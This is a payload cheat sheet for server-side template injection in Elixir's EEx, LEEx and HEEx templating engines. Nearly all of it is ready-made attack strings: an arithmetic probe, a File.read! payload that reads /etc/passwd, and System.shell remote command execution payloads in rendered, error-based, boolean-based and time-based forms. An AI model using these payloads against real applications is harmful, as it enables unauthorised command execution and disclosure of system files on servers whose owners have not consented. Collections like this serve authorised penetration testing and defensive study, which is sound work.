# Server Side Template Injection - Elixir

> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated into templates without proper sanitization or validation.

## Summary

- [Templating Libraries](#templating-libraries)
- [Universal Payloads](#universal-payloads)
- [EEx](#eex)
    - [EEx - Basic injections](#eex---basic-injections)
    - [EEx - Retrieve /etc/passwd](#eex---retrieve-etcpasswd)
    - [EEx - Remote Command execution](#eex---remote-command-execution)
- [References](#references)

## Templating Libraries

| Template Name | Payload Format |
|---------------|----------------|
| EEx           | `<%= %>`       |
| LEEx          | `<%= %>`       |
| HEEx          | `<%= %>`       |

## Universal Payloads

Generic code injection payloads work for many Elixir-based template engines, such as EEx, LEEx and HEEx.

By default, only EEx can render templates from string, but it is possible to use LEEx and HEEx as replacement engines for EEx.

To use these payloads, wrap them in the appropriate tag.

```erlang
elem(System.shell("id"), 0) # Rendered RCE
[1, 2][elem(System.shell("id"), 0)] # Error-Based RCE
1/((elem(System.shell("id"), 1) == 0)&&1||0) # Boolean-Based RCE
elem(System.shell("id && sleep 5"), 0) # Time-Based RCE
```

## EEx

[Official website](https://hexdocs.pm/eex/1.19.5/EEx.html)
> EEx stands for Embedded Elixir.

### EEx - Basic injections

```erlang
<%= 7 * 7 %>
```

### EEx - Retrieve /etc/passwd

```erlang
<%= File.read!("/etc/passwd") %>
```

### EEx - Remote Command execution

```erlang
<%= elem(System.shell("id"), 0) %> # Rendered RCE
<%= [1, 2][elem(System.shell("id"), 0)] %> # Error-Based RCE
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %> # Boolean-Based RCE
<%= elem(System.shell("id && sleep 5"), 0) %> # Time-Based RCE
```

## References

- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
